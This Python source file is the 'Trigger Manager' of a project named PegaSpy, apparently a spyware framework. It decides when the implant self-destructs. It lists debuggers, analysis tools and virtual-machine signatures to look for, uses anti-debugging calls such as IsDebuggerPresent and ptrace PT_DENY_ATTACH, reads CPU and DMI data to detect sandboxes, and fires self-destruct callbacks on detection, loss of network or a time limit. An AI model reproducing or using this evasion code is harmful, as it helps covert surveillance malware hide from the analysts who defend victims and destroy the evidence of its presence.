#!/usr/bin/env python3
"""
PegaSpy Phase 3 - Trigger Manager
Advanced trigger detection and management for self-destruct operations
"""

import os
import sys
import time
import psutil
import hashlib
import asyncio
import platform
import subprocess
import threading
from enum import Enum
from typing import List, Dict, Optional, Tuple, Any, Callable, Set
from dataclasses import dataclass, field
from pathlib import Path
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class TriggerType(Enum):
    """Types of triggers for self-destruct"""
    MANUAL = "manual"
    TIME_BASED = "time_based"
    DETECTION = "detection"
    NETWORK = "network"
    PROCESS = "process"
    FILE_SYSTEM = "file_system"
    REGISTRY = "registry"
    MEMORY = "memory"
    USER_ACTIVITY = "user_activity"
    SYSTEM_SHUTDOWN = "system_shutdown"
    DEBUGGER = "debugger"
    VIRTUAL_MACHINE = "virtual_machine"
    ANALYSIS_TOOLS = "analysis_tools"
    KILL_SWITCH = "kill_switch"
    HEARTBEAT_FAILURE = "heartbeat_failure"

class TriggerCondition(Enum):
    """Trigger condition types"""
    EQUALS = "equals"
    NOT_EQUALS = "not_equals"
    GREATER_THAN = "greater_than"
    LESS_THAN = "less_than"
    CONTAINS = "contains"
    NOT_CONTAINS = "not_contains"
    EXISTS = "exists"
    NOT_EXISTS = "not_exists"
    REGEX_MATCH = "regex_match"
    THRESHOLD_EXCEEDED = "threshold_exceeded"

class TriggerStatus(Enum):
    """Trigger status"""
    INACTIVE = "inactive"
    ACTIVE = "active"
    TRIGGERED = "triggered"
    DISABLED = "disabled"
    ERROR = "error"

class TriggerPriority(Enum):
    """Trigger priority levels"""
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4
    EMERGENCY = 5

@dataclass
class TriggerRule:
    """Individual trigger rule"""
    trigger_id: str
    trigger_type: TriggerType
    condition: TriggerCondition
    target_value: Any
    comparison_value: Any = None
    priority: TriggerPriority = TriggerPriority.MEDIUM
    status: TriggerStatus = TriggerStatus.INACTIVE
    description: str = ""
    check_interval: float = 1.0  # seconds
    max_triggers: int = 1
    trigger_count: int = 0
    last_check: Optional[float] = None
    last_triggered: Optional[float] = None
    error_message: Optional[str] = None
    callback: Optional[Callable] = None
    
    def is_triggered(self) -> bool:
        """Check if trigger has been activated"""
        return self.status == TriggerStatus.TRIGGERED
    
    def can_trigger(self) -> bool:
        """Check if trigger can be activated"""
        return (self.status == TriggerStatus.ACTIVE and 
                self.trigger_count < self.max_triggers)

@dataclass
class TriggerEvent:
    """Trigger event record"""
    trigger_id: str
    trigger_type: TriggerType
    timestamp: float
    priority: TriggerPriority
    description: str
    trigger_value: Any
    metadata: Dict[str, Any] = field(default_factory=dict)

class TriggerManager:
    """Advanced trigger detection and management system"""
    
    def __init__(self):
        self.triggers: Dict[str, TriggerRule] = {}
        self.trigger_events: List[TriggerEvent] = []
        self.is_monitoring = False
        self.stop_monitoring = False
        self.monitor_tasks: List[asyncio.Task] = []
        
        # System information
        self.platform = platform.system().lower()
        self.start_time = time.time()
        
        # Detection databases
        self.known_debuggers = {
            'windows': [
                'ollydbg.exe', 'windbg.exe', 'x64dbg.exe', 'x32dbg.exe',
                'ida.exe', 'ida64.exe', 'idaq.exe', 'idaq64.exe',
                'devenv.exe', 'msvsmon.exe', 'vsjitdebugger.exe'
            ],
            'darwin': [
                'lldb', 'gdb', 'dtrace', 'dtruss', 'instruments',
                'sample', 'spindump', 'heap', 'leaks', 'vmmap'
            ],
            'linux': [
                'gdb', 'strace', 'ltrace', 'valgrind', 'perf',
                'objdump', 'readelf', 'hexdump', 'xxd'
            ]
        }
        
        self.known_analysis_tools = {
            'windows': [
                'procmon.exe', 'procexp.exe', 'tcpview.exe', 'autoruns.exe',
                'wireshark.exe', 'fiddler.exe', 'regshot.exe', 'pestudio.exe'
            ],
            'darwin': [
                'wireshark', 'tcpdump', 'nettop', 'lsof', 'fs_usage',
                'opensnoop', 'execsnoop', 'iosnoop'
            ],
            'linux': [
                'wireshark', 'tcpdump', 'netstat', 'lsof', 'strace',
                'ltrace', 'iotop', 'htop', 'ss'
            ]
        }
        
        self.vm_indicators = {
            'windows': [
                'vmware', 'virtualbox', 'vbox', 'qemu', 'xen',
                'vmtoolsd.exe', 'vboxservice.exe', 'vboxtray.exe'
            ],
            'darwin': [
                'vmware', 'parallels', 'virtualbox', 'utm',
                'com.vmware.fusion', 'com.parallels.desktop'
            ],
            'linux': [
                'vmware', 'virtualbox', 'qemu', 'xen', 'kvm',
                'vmtoolsd', 'vboxguest', 'vboxsf'
            ]
        }
        
        # Callback for trigger activation
        self.trigger_callback: Optional[Callable] = None
    
    def set_trigger_callback(self, callback: Callable[[TriggerEvent], None]):
        """Set callback function for trigger activation"""
        self.trigger_callback = callback
        logger.info("Trigger callback set")
    
    def add_trigger(self, trigger_rule: TriggerRule) -> bool:
        """Add a trigger rule"""
        try:
            if trigger_rule.trigger_id in self.triggers:
                logger.warning(f"Trigger {trigger_rule.trigger_id} already exists")
                return False
            
            self.triggers[trigger_rule.trigger_id] = trigger_rule
            logger.info(f"Added trigger: {trigger_rule.trigger_id} ({trigger_rule.trigger_type.value})")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add trigger: {e}")
            return False
    
    def remove_trigger(self, trigger_id: str) -> bool:
        """Remove a trigger rule"""
        try:
            if trigger_id in self.triggers:
                del self.triggers[trigger_id]
                logger.info(f"Removed trigger: {trigger_id}")
                return True
            return False
            
        except Exception as e:
            logger.error(f"Failed to remove trigger: {e}")
            return False
    
    def activate_trigger(self, trigger_id: str) -> bool:
        """Activate a trigger"""
        try:
            if trigger_id in self.triggers:
                self.triggers[trigger_id].status = TriggerStatus.ACTIVE
                logger.info(f"Activated trigger: {trigger_id}")
                return True
            return False
            
        except Exception as e:
            logger.error(f"Failed to activate trigger: {e}")
            return False
    
    def deactivate_trigger(self, trigger_id: str) -> bool:
        """Deactivate a trigger"""
        try:
            if trigger_id in self.triggers:
                self.triggers[trigger_id].status = TriggerStatus.INACTIVE
                logger.info(f"Deactivated trigger: {trigger_id}")
                return True
            return False
            
        except Exception as e:
            logger.error(f"Failed to deactivate trigger: {e}")
            return False
    
    def add_default_triggers(self) -> bool:
        """Add default security triggers"""
        try:
            default_triggers = [
                # Debugger detection
                TriggerRule(
                    trigger_id="debugger_detection",
                    trigger_type=TriggerType.DEBUGGER,
                    condition=TriggerCondition.EXISTS,
                    target_value="debugger_process",
                    priority=TriggerPriority.CRITICAL,
                    description="Debugger process detected",
                    check_interval=2.0
                ),
                
                # VM detection
                TriggerRule(
                    trigger_id="vm_detection",
                    trigger_type=TriggerType.VIRTUAL_MACHINE,
                    condition=TriggerCondition.EXISTS,
                    target_value="vm_indicator",
                    priority=TriggerPriority.HIGH,
                    description="Virtual machine detected",
                    check_interval=5.0
                ),
                
                # Analysis tools detection
                TriggerRule(
                    trigger_id="analysis_tools_detection",
                    trigger_type=TriggerType.ANALYSIS_TOOLS,
                    condition=TriggerCondition.EXISTS,
                    target_value="analysis_process",
                    priority=TriggerPriority.HIGH,
                    description="Analysis tools detected",
                    check_interval=3.0
                ),
                
                # Time-based trigger (24 hours)
                TriggerRule(
                    trigger_id="time_limit",
                    trigger_type=TriggerType.TIME_BASED,
                    condition=TriggerCondition.GREATER_THAN,
                    target_value="uptime",
                    comparison_value=24 * 3600,  # 24 hours
                    priority=TriggerPriority.MEDIUM,
                    description="Time limit exceeded",
                    check_interval=60.0
                ),
                
                # Network disconnection
                TriggerRule(
                    trigger_id="network_disconnection",
                    trigger_type=TriggerType.NETWORK,
                    condition=TriggerCondition.NOT_EXISTS,
                    target_value="internet_connection",
                    priority=TriggerPriority.MEDIUM,
                    description="Network disconnection detected",
                    check_interval=30.0
                ),
                
                # System shutdown
                TriggerRule(
                    trigger_id="system_shutdown",
                    trigger_type=TriggerType.SYSTEM_SHUTDOWN,
                    condition=TriggerCondition.EXISTS,
                    target_value="shutdown_signal",
                    priority=TriggerPriority.HIGH,
                    description="System shutdown detected",
                    check_interval=1.0
                ),
                
                # Memory analysis detection
                TriggerRule(
                    trigger_id="memory_analysis",
                    trigger_type=TriggerType.MEMORY,
                    condition=TriggerCondition.THRESHOLD_EXCEEDED,
                    target_value="memory_access_pattern",
                    comparison_value=100,  # suspicious access count
                    priority=TriggerPriority.HIGH,
                    description="Memory analysis detected",
                    check_interval=5.0
                )
            ]
            
            for trigger in default_triggers:
                self.add_trigger(trigger)
            
            logger.info(f"Added {len(default_triggers)} default triggers")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add default triggers: {e}")
            return False
    
    async def start_monitoring(self) -> bool:
        """Start trigger monitoring"""
        if self.is_monitoring:
            logger.warning("Trigger monitoring already active")
            return False
        
        try:
            self.is_monitoring = True
            self.stop_monitoring = False
            
            # Start monitoring tasks for each trigger type
            monitor_functions = {
                TriggerType.DEBUGGER: self._monitor_debugger,
                TriggerType.VIRTUAL_MACHINE: self._monitor_vm,
                TriggerType.ANALYSIS_TOOLS: self._monitor_analysis_tools,
                TriggerType.TIME_BASED: self._monitor_time_based,
                TriggerType.NETWORK: self._monitor_network,
                TriggerType.PROCESS: self._monitor_process,
                TriggerType.FILE_SYSTEM: self._monitor_file_system,
                TriggerType.MEMORY: self._monitor_memory,
                TriggerType.USER_ACTIVITY: self._monitor_user_activity,
                TriggerType.SYSTEM_SHUTDOWN: self._monitor_system_shutdown
            }
            
            # Create monitoring tasks
            for trigger_type, monitor_func in monitor_functions.items():
                task = asyncio.create_task(monitor_func())
                self.monitor_tasks.append(task)
            
            logger.info(f"Started trigger monitoring with {len(self.monitor_tasks)} tasks")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start monitoring: {e}")
            self.is_monitoring = False
            return False
    
    async def stop_monitoring(self) -> bool:
        """Stop trigger monitoring"""
        try:
            self.stop_monitoring = True
            
            # Cancel all monitoring tasks
            for task in self.monitor_tasks:
                if not task.done():
                    task.cancel()
            
            # Wait for tasks to complete
            if self.monitor_tasks:
                await asyncio.gather(*self.monitor_tasks, return_exceptions=True)
            
            self.monitor_tasks.clear()
            self.is_monitoring = False
            
            logger.info("Stopped trigger monitoring")
            return True
            
        except Exception as e:
            logger.error(f"Failed to stop monitoring: {e}")
            return False
    
    async def _monitor_debugger(self):
        """Monitor for debugger processes"""
        try:
            while not self.stop_monitoring:
                debugger_triggers = [t for t in self.triggers.values() 
                                   if t.trigger_type == TriggerType.DEBUGGER and t.status == TriggerStatus.ACTIVE]
                
                for trigger in debugger_triggers:
                    if not trigger.can_trigger():
                        continue
                    
                    # Check for debugger processes
                    debugger_found = False
                    debugger_name = ""
                    
                    try:
                        for proc in psutil.process_iter(['pid', 'name']):
                            proc_name = proc.info['name'].lower()
                            
                            if self.platform in self.known_debuggers:
                                for debugger in self.known_debuggers[self.platform]:
                                    if debugger.lower() in proc_name:
                                        debugger_found = True
                                        debugger_name = proc.info['name']
                                        break
                            
                            if debugger_found:
                                break
                    except Exception:
                        pass
                    
                    # Check for debugger detection via other methods
                    if not debugger_found:
                        debugger_found = self._detect_debugger_advanced()
                    
                    if debugger_found:
                        await self._trigger_activated(trigger, {
                            'debugger_name': debugger_name,
                            'detection_method': 'process_scan'
                        })
                    
                    trigger.last_check = time.time()
                    await asyncio.sleep(0.1)
                
                await asyncio.sleep(1.0)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Debugger monitoring error: {e}")
    
    def _detect_debugger_advanced(self) -> bool:
        """Advanced debugger detection techniques"""
        try:
            if self.platform == 'windows':
                # Check for debugger using Windows API
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    
                    # IsDebuggerPresent
                    if kernel32.IsDebuggerPresent():
                        return True
                    
                    # CheckRemoteDebuggerPresent
                    debug_flag = ctypes.c_bool()
                    if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(debug_flag)):
                        if debug_flag.value:
                            return True
                    
                    # NtGlobalFlag check
                    peb = ctypes.c_void_p()
                    ntdll = ctypes.windll.ntdll
                    ntdll.NtQueryInformationProcess(
                        kernel32.GetCurrentProcess(), 7, ctypes.byref(peb), 
                        ctypes.sizeof(peb), None
                    )
                    
                except Exception:
                    pass
            
            elif self.platform in ['darwin', 'linux']:
                # Check for ptrace
                try:
                    import ctypes
                    libc = ctypes.CDLL("libc.so.6" if self.platform == 'linux' else "libc.dylib")
                    
                    # Try to ptrace ourselves
                    PT_DENY_ATTACH = 31 if self.platform == 'darwin' else 0
                    result = libc.ptrace(PT_DENY_ATTACH, 0, 0, 0)
                    
                    if result == -1:
                        return True
                        
                except Exception:
                    pass
            
            return False
            
        except Exception:
            return False
    
    async def _monitor_vm(self):
        """Monitor for virtual machine indicators"""
        try:
            while not self.stop_monitoring:
                vm_triggers = [t for t in self.triggers.values() 
                             if t.trigger_type == TriggerType.VIRTUAL_MACHINE and t.status == TriggerStatus.ACTIVE]
                
                for trigger in vm_triggers:
                    if not trigger.can_trigger():
                        continue
                    
                    vm_detected = False
                    vm_indicator = ""
                    
                    # Check processes
                    try:
                        for proc in psutil.process_iter(['pid', 'name']):
                            proc_name = proc.info['name'].lower()
                            
                            if self.platform in self.vm_indicators:
                                for indicator in self.vm_indicators[self.platform]:
                                    if indicator.lower() in proc_name:
                                        vm_detected = True
                                        vm_indicator = proc.info['name']
                                        break
                            
                            if vm_detected:
                                break
                    except Exception:
                        pass
                    
                    # Check hardware indicators
                    if not vm_detected:
                        vm_detected, vm_indicator = self._detect_vm_hardware()
                    
                    if vm_detected:
                        await self._trigger_activated(trigger, {
                            'vm_indicator': vm_indicator,
                            'detection_method': 'hardware_scan'
                        })
                    
                    trigger.last_check = time.time()
                    await asyncio.sleep(0.1)
                
                await asyncio.sleep(2.0)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"VM monitoring error: {e}")
    
    def _detect_vm_hardware(self) -> Tuple[bool, str]:
        """Detect VM through hardware indicators"""
        try:
            # Check CPU information
            with open('/proc/cpuinfo', 'r') as f:
                cpu_info = f.read().lower()
                vm_signatures = ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']
                for signature in vm_signatures:
                    if signature in cpu_info:
                        return True, f"CPU: {signature}"
            
            # Check DMI information
            dmi_paths = [
                '/sys/class/dmi/id/sys_vendor',
                '/sys/class/dmi/id/product_name',
                '/sys/class/dmi/id/board_vendor'
            ]
            
            for path in dmi_paths:
                try:
                    with open(path, 'r') as f:
                        content = f.read().lower().strip()
                        vm_signatures = ['vmware', 'virtualbox', 'qemu', 'xen', 'microsoft corporation']
                        for signature in vm_signatures:
                            if signature in content:
                                return True, f"DMI: {content}"
                except Exception:
                    continue
            
            return False, ""
            
        except Exception:
            return False, ""
    
    async def _monitor_analysis_tools(self):
        """Monitor for analysis tools"""
        try:
            while not self.stop_monitoring:
                analysis_triggers = [t for t in self.triggers.values() 
                                   if t.trigger_type == TriggerType.ANALYSIS_TOOLS and t.status == TriggerStatus.ACTIVE]
                
                for trigger in analysis_triggers:
                    if not trigger.can_trigger():
                        continue
                    
                    tool_found = False
                    tool_name = ""
                    
                    try:
                        for proc in psutil.process_iter(['pid', 'name']):
                            proc_name = proc.info['name'].lower()
                            
                            if self.platform in self.known_analysis_tools:
                                for tool in self.known_analysis_tools[self.platform]:
                                    if tool.lower() in proc_name:
                                        tool_found = True
                                        tool_name = proc.info['name']
                                        break
                            
                            if tool_found:
                                break
                    except Exception:
                        pass
                    
                    if tool_found:
                        await self._trigger_activated(trigger, {
                            'tool_name': tool_name,
                            'detection_method': 'process_scan'
                        })
                    
                    trigger.last_check = time.time()
                    await asyncio.sleep(0.1)
                
                await asyncio.sleep(2.0)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Analysis tools monitoring error: {e}")
    
    async def _monitor_time_based(self):
        """Monitor time-based triggers"""
        try:
            while not self.stop_monitoring:
                time_triggers = [t for t in self.triggers.values() 
                               if t.trigger_type == TriggerType.TIME_BASED and t.status == TriggerStatus.ACTIVE]
                
                current_time = time.time()
                uptime = current_time - self.start_time
                
                for trigger in time_triggers:
                    if not trigger.can_trigger():
                        continue
                    
                    triggered = False
                    
                    if trigger.target_value == "uptime":
                        if trigger.condition == TriggerCondition.GREATER_THAN:
                            if uptime > trigger.comparison_value:
                                triggered = True
                        elif trigger.condition == TriggerCondition.LESS_THAN:
                            if uptime < trigger.comparison_value:
                                triggered = True
                    
                    if triggered:
                        await self._trigger_activated(trigger, {
                            'uptime': uptime,
                            'threshold': trigger.comparison_value
                        })
                    
                    trigger.last_check = current_time
                    await asyncio.sleep(0.1)
                
                await asyncio.sleep(10.0)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Time-based monitoring error: {e}")
    
    async def _monitor_network(self):
        """Monitor network-based triggers"""
        try:
            while not self.stop_monitoring:
                network_triggers = [t for t in self.triggers.values() 
                                  if t.trigger_type == TriggerType.NETWORK and t.status == TriggerStatus.ACTIVE]
                
                for trigger in network_triggers:
                    if not trigger.can_trigger():
                        continue
                    
                    triggered = False
                    
                    if trigger.target_value == "internet_connection":
                        has_connection = self._check_internet_connection()
                        
                        if trigger.condition == TriggerCondition.NOT_EXISTS and not has_connection:
                            triggered = True
                        elif trigger.condition == TriggerCondition.EXISTS and has_connection:
                            triggered = True
                    
                    if triggered:
                        await self._trigger_activated(trigger, {
                            'connection_status': self._check_internet_connection()
                        })
                    
                    trigger.last_check = time.time()
                    await asyncio.sleep(0.1)
                
                await asyncio.sleep(5.0)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Network monitoring error: {e}")
    
    def _check_internet_connection(self) -> bool:
        """Check if internet connection is available"""
        try:
            import socket
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except Exception:
            return False
    
    async def _monitor_process(self):
        """Monitor process-based triggers"""
        try:
            while not self.stop_monitoring:
                # Implementation for process monitoring
                await asyncio.sleep(1.0)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Process monitoring error: {e}")
    
    async def _monitor_file_system(self):
        """Monitor file system-based triggers"""
        try:
            while not self.stop_monitoring:
                # Implementation for file system monitoring
                await asyncio.sleep(1.0)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"File system monitoring error: {e}")
    
    async def _monitor_memory(self):
        """Monitor memory-based triggers"""
        try:
            while not self.stop_monitoring:
                memory_triggers = [t for t in self.triggers.values() 
                                 if t.trigger_type == TriggerType.MEMORY and t.status == TriggerStatus.ACTIVE]
                
                for trigger in memory_triggers:
                    if not trigger.can_trigger():
                        continue
                    
                    # Simplified memory analysis detection
                    memory_usage = psutil.virtual_memory().percent
                    
                    if trigger.condition == TriggerCondition.THRESHOLD_EXCEEDED:
                        if memory_usage > trigger.comparison_value:
                            await self._trigger_activated(trigger, {
                                'memory_usage': memory_usage
                            })
                    
                    trigger.last_check = time.time()
                    await asyncio.sleep(0.1)
                
                await asyncio.sleep(3.0)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Memory monitoring error: {e}")
    
    async def _monitor_user_activity(self):
        """Monitor user activity-based triggers"""
        try:
            while not self.stop_monitoring:
                # Implementation for user activity monitoring
                await asyncio.sleep(1.0)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"User activity monitoring error: {e}")
    
    async def _monitor_system_shutdown(self):
        """Monitor system shutdown triggers"""
        try:
            while not self.stop_monitoring:
                # Implementation for shutdown monitoring
                await asyncio.sleep(1.0)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"System shutdown monitoring error: {e}")
    
    async def _trigger_activated(self, trigger: TriggerRule, metadata: Dict[str, Any]):
        """Handle trigger activation"""
        try:
            trigger.status = TriggerStatus.TRIGGERED
            trigger.trigger_count += 1
            trigger.last_triggered = time.time()
            
            # Create trigger event
            event = TriggerEvent(
                trigger_id=trigger.trigger_id,
                trigger_type=trigger.trigger_type,
                timestamp=time.time(),
                priority=trigger.priority,
                description=trigger.description,
                trigger_value=trigger.target_value,
                metadata=metadata
            )
            
            self.trigger_events.append(event)
            
            logger.warning(f"TRIGGER ACTIVATED: {trigger.trigger_id} - {trigger.description}")
            
            # Call trigger callback if set
            if self.trigger_callback:
                try:
                    if asyncio.iscoroutinefunction(self.trigger_callback):
                        await self.trigger_callback(event)
                    else:
                        self.trigger_callback(event)
                except Exception as e:
                    logger.error(f"Trigger callback error: {e}")
            
            # Call individual trigger callback if set
            if trigger.callback:
                try:
                    if asyncio.iscoroutinefunction(trigger.callback):
                        await trigger.callback(event)
                    else:
                        trigger.callback(event)
                except Exception as e:
                    logger.error(f"Individual trigger callback error: {e}")
            
        except Exception as e:
            logger.error(f"Trigger activation error: {e}")
    
    def manual_trigger(self, trigger_id: str, metadata: Dict[str, Any] = None) -> bool:
        """Manually activate a trigger"""
        try:
            if trigger_id in self.triggers:
                trigger = self.triggers[trigger_id]
                if trigger.can_trigger():
                    asyncio.create_task(self._trigger_activated(trigger, metadata or {}))
                    return True
            return False
            
        except Exception as e:
            logger.error(f"Manual trigger failed: {e}")
            return False
    
    def get_trigger_status(self) -> Dict[str, Any]:
        """Get current trigger status"""
        return {
            'is_monitoring': self.is_monitoring,
            'total_triggers': len(self.triggers),
            'active_triggers': len([t for t in self.triggers.values() if t.status == TriggerStatus.ACTIVE]),
            'triggered_count': len([t for t in self.triggers.values() if t.status == TriggerStatus.TRIGGERED]),
            'total_events': len(self.trigger_events),
            'recent_events': [
                {
                    'trigger_id': event.trigger_id,
                    'trigger_type': event.trigger_type.value,
                    'timestamp': event.timestamp,
                    'priority': event.priority.value,
                    'description': event.description,
                    'metadata': event.metadata
                }
                for event in self.trigger_events[-10:]  # Last 10 events
            ],
            'triggers': {
                trigger_id: {
                    'trigger_type': trigger.trigger_type.value,
                    'status': trigger.status.value,
                    'priority': trigger.priority.value,
                    'description': trigger.description,
                    'trigger_count': trigger.trigger_count,
                    'last_check': trigger.last_check,
                    'last_triggered': trigger.last_triggered,
                    'error_message': trigger.error_message
                }
                for trigger_id, trigger in self.triggers.items()
            }
        }
    
    def clear_trigger_events(self) -> int:
        """Clear trigger event history"""
        count = len(self.trigger_events)
        self.trigger_events.clear()
        logger.info(f"Cleared {count} trigger events")
        return count
    
    async def emergency_stop(self) -> bool:
        """Emergency stop all monitoring"""
        try:
            logger.warning("EMERGENCY TRIGGER STOP INITIATED")
            await self.stop_monitoring()
            
            # Disable all triggers
            for trigger in self.triggers.values():
                trigger.status = TriggerStatus.DISABLED
            
            return True
            
        except Exception as e:
            logger.error(f"Emergency stop failed: {e}")
            return False

# Test function
if __name__ == "__main__":
    async def test_trigger_manager():
        """Test the trigger manager"""
        manager = TriggerManager()
        
        print("Testing Trigger Manager...")
        
        # Set up callback
        def trigger_callback(event: TriggerEvent):
            print(f"TRIGGER FIRED: {event.trigger_id} - {event.description}")
        
        manager.set_trigger_callback(trigger_callback)
        
        # Add default triggers
        print("\n1. Adding default triggers...")
        success = manager.add_default_triggers()
        print(f"Default triggers added: {success}")
        
        # Activate triggers
        print("\n2. Activating triggers...")
        for trigger_id in manager.triggers.keys():
            manager.activate_trigger(trigger_id)
        
        # Start monitoring
        print("\n3. Starting monitoring...")
        success = await manager.start_monitoring()
        print(f"Monitoring started: {success}")
        
        # Let it run for a few seconds
        print("\n4. Monitoring for 5 seconds...")
        await asyncio.sleep(5.0)
        
        # Test manual trigger
        print("\n5. Testing manual trigger...")
        success = manager.manual_trigger("debugger_detection", {"test": True})
        print(f"Manual trigger fired: {success}")
        
        await asyncio.sleep(1.0)
        
        # Get status
        status = manager.get_trigger_status()
        print(f"\nTrigger Status:")
        print(f"  Total triggers: {status['total_triggers']}")
        print(f"  Active triggers: {status['active_triggers']}")
        print(f"  Triggered count: {status['triggered_count']}")
        print(f"  Total events: {status['total_events']}")
        
        # Stop monitoring
        print("\n6. Stopping monitoring...")
        success = await manager.stop_monitoring()
        print(f"Monitoring stopped: {success}")
        
        print("\nTrigger manager test complete")
    
    # Run the test
    asyncio.run(test_trigger_manager())